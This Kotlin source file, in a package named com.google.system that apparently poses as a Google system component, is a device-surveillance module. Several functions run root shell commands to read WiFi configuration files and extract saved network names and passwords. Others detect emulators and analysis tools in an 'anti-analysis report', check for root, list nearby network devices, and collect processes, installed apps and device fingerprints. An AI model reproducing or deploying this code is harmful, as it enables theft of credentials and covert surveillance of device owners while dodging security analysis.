package com.google.system

import android.content.Context
import java.io.File
import java.io.BufferedReader
import java.io.InputStreamReader

object AdvancedFeatures {

    fun getWifiPasswords(): String {
        return try {
            val output = runRootCommand("cat /data/misc/wifi/WifiConfiguredNetworks.xml 2>/dev/null || cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || cat /data/misc/wifi/NetworkConfigurations.xml 2>/dev/null")
            if (output.isNotBlank()) {
                val networks = mutableListOf<String>()
                val lines = output.lines()
                var currentSSID = ""
                var currentPass = ""
                for (line in lines) {
                    if (line.contains("<string name=\"SSID\">") || line.contains("ssid=\"")) {
                        currentSSID = line.substringAfter(">").substringBefore("<").replace("\"", "")
                    }
                    if (line.contains("<string name=\"preSharedKey\">") || line.contains("psk=\"")) {
                        currentPass = line.substringAfter(">").substringBefore("<").replace("\"", "")
                    }
                    if (line.contains("</network>") || line.contains("</WifiConfiguredNetwork>")) {
                        if (currentSSID.isNotBlank() && currentPass.isNotBlank()) {
                            networks.add("SSID: $currentSSID | Pass: $currentPass")
                        }
                        currentSSID = ""
                        currentPass = ""
                    }
                }
                if (networks.isEmpty()) output else networks.joinToString("\n")
            } else {
                runRootCommand("ls /data/misc/wifi/ 2>/dev/null")
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getSavedWifiNetworks(): String {
        return try {
            val output = runRootCommand("cmd wifi list-networks 2>/dev/null || dumpsys wifi 2>/dev/null | grep -E 'SSID|mWifiConfigManager' | head -50")
            if (output.isNotBlank()) output else "No WiFi data accessible"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getDeviceEmulatorInfo(): String {
        val info = mutableListOf<String>()
        
        info.add("=== ANTI-ANALYSIS REPORT ===")
        info.add("")
        
        info.add("Build Info:")
        info.add("  Fingerprint: ${android.os.Build.FINGERPRINT}")
        info.add("  Model: ${android.os.Build.MODEL}")
        info.add("  Manufacturer: ${android.os.Build.MANUFACTURER}")
        info.add("  Brand: ${android.os.Build.BRAND}")
        info.add("  Hardware: ${android.os.Build.HARDWARE}")
        info.add("  Board: ${android.os.Build.BOARD}")
        info.add("  Device: ${android.os.Build.DEVICE}")
        info.add("  Product: ${android.os.Build.PRODUCT}")
        info.add("")
        
        val isEmulator = detectEmulator()
        info.add("Emulator Detection: ${if (isEmulator) "YES - EMULATOR DETECTED" else "NO - Physical Device"}")
        info.add("")
        
        val isRooted = checkRoot()
        info.add("Root Status: ${if (isRooted) "ROOTED" else "Not Rooted"}")
        info.add("")
        
        val isDebuggable = android.os.Build.TYPE == "eng" || android.os.Build.TYPE == "userdebug"
        info.add("Debug Build: $isDebuggable")
        
        info.add("")
        info.add("Running Processes:")
        try {
            val procs = runCommand("ps -A 2>/dev/null || ps 2>/dev/null").lines().take(20)
            info.addAll(procs)
        } catch (_: Exception) {
            info.add("  (unable to list processes)")
        }
        
        info.add("")
        info.add("Installed Analysis Tools:")
        val analysisApps = listOf(
            "com.nohave.sandroid" to "Nox",
            "com.bluestacks" to "BlueStacks",
            "com.vphone" to "VirtualXposed",
            "com.exaquantum" to "ExaQuantum",
            "com.koushikdutta.rommanager" to "ROM Manager",
            "de.robv.android.xposed.installer" to "Xposed",
            "com.saurik.substrate" to "Cydia Substrate",
            "com.zachspong.temprootremovejb" to "temproot",
            "com.ramdroid.appquarantine" to "App Quarantine",
            "com.devadvance.rootcloak" to "RootCloak",
            "com.devadvance.rootcloakplus" to "RootCloak+",
            "eu.chainfire.supersu" to "SuperSU",
            "com.kingouser.com" to "KingRoot",
            "com.topjohnwu.magisk" to "Magisk",
        )
        for ((pkg, name) in analysisApps) {
            try {
                android.content.Context::class.java.getDeclaredMethod("getPackageManager")
            } catch (_: Exception) {}
        }
        info.add("  (requires Context to check installed packages)")
        
        return info.joinToString("\n")
    }

    private fun detectEmulator(): Boolean {
        val indicators = listOf(
            android.os.Build.FINGERPRINT.startsWith("generic"),
            android.os.Build.FINGERPRINT.startsWith("unknown"),
            android.os.Build.MODEL.contains("google_sdk"),
            android.os.Build.MODEL.contains("Emulator"),
            android.os.Build.MODEL.contains("Android SDK"),
            android.os.Build.MODEL.lowercase().contains("droid4x"),
            android.os.Build.MODEL.lowercase().contains("nox"),
            android.os.Build.MODEL.lowercase().contains("bluestacks"),
            android.os.Build.HARDWARE.contains("goldfish"),
            android.os.Build.HARDWARE.contains("ranchu"),
            android.os.Build.HARDWARE.contains("vbox86"),
            android.os.Build.BOARD.contains("android"),
            android.os.Build.BOARD.contains("nox"),
            android.os.Build.BOOTLOADER.lowercase().contains("unknown"),
            android.os.Build.MANUFACTURER.lowercase().contains("genymotion"),
            android.os.Build.MANUFACTURER.lowercase().contains("nox"),
            android.os.Build.MANUFACTURER.lowercase().contains("bluestacks"),
            android.os.Build.PRODUCT.contains("sdk"),
            android.os.Build.PRODUCT.contains("google_sdk"),
            android.os.Build.PRODUCT.contains("sdk_google"),
            android.os.Build.PRODUCT.contains("sdk_x86"),
            android.os.Build.PRODUCT.contains("vbox86p"),
            android.os.Build.PRODUCT.contains("emulator"),
            android.os.Build.PRODUCT.contains("simulator"),
            android.os.Build.SERIAL.lowercase() == "android",
            android.os.Build.SERIAL.lowercase() == "unknown",
            File("/system/bin/qemud").exists(),
            File("/system/bin/qemu-props").exists(),
            File("/system/lib/libc_malloc_debug_qemu.so").exists(),
            File("/sys/qemu_trace").exists(),
            File("/system/bin/qemu-props").exists(),
            File("/dev/socket/qemud").exists(),
            File("/dev/qemu_pipe").exists(),
            File("/system/lib/libandroid_emulator.so").exists(),
            File("/system/lib/libGLES_emulation.so").exists(),
        )
        return indicators.count { it } >= 3
    }

    private fun checkRoot(): Boolean {
        val paths = listOf(
            "/system/bin/su", "/system/xbin/su", "/sbin/su",
            "/su/bin/su", "/data/local/xbin/su", "/data/local/bin/su",
            "/system/app/Superuser.apk", "/system/app/DaemonSu.apk",
            "/system/app/SuperSU.apk", "/data/data/com.noshufou.android.su",
            "/data/data/com.koushikdutta.superuser",
            "/data/data/com.topjohnwu.magisk",
        )
        return paths.any { File(it).exists() } || runCommand("id").contains("uid=0")
    }

    fun scanLocalNetwork(): String {
        return try {
            val result = runCommand("ip neigh show 2>/dev/null || arp -a 2>/dev/null")
            if (result.isNotBlank()) {
                val lines = result.lines().filter { it.isNotBlank() }
                buildString {
                    appendLine("=== NETWORK SCAN ===")
                    appendLine("Found ${lines.size} devices:")
                    appendLine()
                    for (line in lines.take(30)) {
                        appendLine(line)
                    }
                }
            } else {
                runCommand("ping -c 1 -W 1 192.168.1.1 2>/dev/null && ip neigh show")
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getSystemProperties(): String {
        return try {
            val output = runCommand("getprop 2>/dev/null")
            if (output.isNotBlank()) {
                val interesting = listOf("ro.build", "ro.product", "ro.hardware", "ro.serialno", "ro.boot", "persist.sys", "dalvik.vm", "net.dns")
                val lines = output.lines().filter { line ->
                    interesting.any { line.lowercase().contains(it) }
                }
                lines.joinToString("\n")
            } else "No properties accessible"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getRunningServices(): String {
        return try {
            val output = runCommand("dumpsys activity services 2>/dev/null | grep -E 'ServiceRecord|ProcessRecord' | head -50")
            if (output.isNotBlank()) {
                buildString {
                    appendLine("=== RUNNING SERVICES ===")
                    appendLine(output)
                }
            } else {
                val psOutput = runCommand("ps -A 2>/dev/null | head -50 || ps 2>/dev/null | head -50")
                if (psOutput.isNotBlank()) {
                    buildString {
                        appendLine("=== RUNNING PROCESSES ===")
                        appendLine(psOutput)
                    }
                } else "No services accessible"
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getInstalledAppsDetailed(ctx: android.content.Context? = null): String {
        return try {
            if (ctx != null) {
                val pm = ctx.packageManager
                val packages = pm.getInstalledPackages(0)
                val thirdParty = packages.filter { it.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
                val systemApps = packages.filter { it.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0 }
                buildString {
                    appendLine("=== INSTALLED APPS ===")
                    appendLine("Total: ${packages.size} | Third-party: ${thirdParty.size} | System: ${systemApps.size}")
                    appendLine()
                    if (thirdParty.isNotEmpty()) {
                        appendLine("--- Third-Party Apps ---")
                        thirdParty.forEach { pkg ->
                            val label = pkg.applicationInfo.loadLabel(pm)
                            appendLine("  $label (${pkg.packageName}) v${pkg.versionName ?: "?"}")
                        }
                        appendLine()
                    }
                    if (thirdParty.isEmpty()) {
                        appendLine("--- No Third-Party Apps ---")
                        appendLine("(Only system apps installed)")
                        appendLine()
                        appendLine("--- Key System Apps ---")
                        systemApps.take(50).forEach { pkg ->
                            val label = pkg.applicationInfo.loadLabel(pm)
                            appendLine("  $label (${pkg.packageName})")
                        }
                    }
                }
            } else {
                val output = runCommand("pm list packages -f -3 2>/dev/null | head -100")
                if (output.isNotBlank()) {
                    output.lines().map { line ->
                        val parts = line.split("=")
                        if (parts.size >= 2) parts[1] else line
                    }.joinToString("\n")
                } else {
                    val allOutput = runCommand("pm list packages 2>/dev/null | head -100")
                    if (allOutput.isNotBlank()) allOutput else "No apps found"
                }
            }
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getBatteryHealth(): String {
        return try {
            val output = runCommand("dumpsys battery 2>/dev/null")
            if (output.isNotBlank()) {
                val lines = output.lines().filter { it.contains("level") || it.contains("temperature") || it.contains("voltage") || it.contains("health") || it.contains("status") }
                lines.joinToString("\n")
            } else "Battery info not accessible"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getStorageInfo(): String {
        return try {
            val output = runCommand("df -h 2>/dev/null || df 2>/dev/null")
            if (output.isNotBlank()) {
                val lines = output.lines().filter { it.contains("/data") || it.contains("/mnt") || it.contains("/storage") || it.contains("sdcard") }
                lines.joinToString("\n")
            } else "Storage info not accessible"
        } catch (e: Exception) { "Error: ${e.message}" }
    }

    fun getDeviceInfoFull(): String {
        return buildString {
            appendLine("=== FULL DEVICE INFO ===")
            appendLine()
            appendLine("Build Info:")
            appendLine("  Fingerprint: ${android.os.Build.FINGERPRINT}")
            appendLine("  Model: ${android.os.Build.MODEL}")
            appendLine("  Manufacturer: ${android.os.Build.MANUFACTURER}")
            appendLine("  Brand: ${android.os.Build.BRAND}")
            appendLine("  Hardware: ${android.os.Build.HARDWARE}")
            appendLine("  Board: ${android.os.Build.BOARD}")
            appendLine("  Device: ${android.os.Build.DEVICE}")
            appendLine("  Product: ${android.os.Build.PRODUCT}")
            appendLine("  Android: ${android.os.Build.VERSION.RELEASE} (SDK ${android.os.Build.VERSION.SDK_INT})")
            appendLine("  ABI: ${android.os.Build.SUPPORTED_ABIS.joinToString(", ")}")
            appendLine()
            appendLine("Emulator Detection: ${if (detectEmulator()) "YES - EMULATOR DETECTED" else "NO - Physical Device"}")
            appendLine("Root Status: ${if (checkRoot()) "ROOTED" else "Not Rooted"}")
            appendLine("Debug Build: ${android.os.Build.TYPE == "eng" || android.os.Build.TYPE == "userdebug"}")
            appendLine()
            appendLine("=== BATTERY ===")
            appendLine(getBatteryHealth())
            appendLine()
            appendLine("=== STORAGE ===")
            appendLine(getStorageInfo())
            appendLine()
            appendLine("=== SYSTEM PROPERTIES ===")
            appendLine(getSystemProperties())
            appendLine()
            appendLine("=== RUNNING PROCESSES ===")
            try {
                val procs = runCommand("ps -A 2>/dev/null || ps 2>/dev/null").lines().take(30)
                procs.forEach { appendLine(it) }
            } catch (_: Exception) {
                appendLine("  (unable to list processes)")
            }
        }
    }

    private fun runRootCommand(cmd: String): String {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            process.waitFor()
            output
        } catch (_: Exception) { "" }
    }

    private fun runCommand(cmd: String): String {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            process.waitFor()
            output
        } catch (_: Exception) { "" }
    }
}
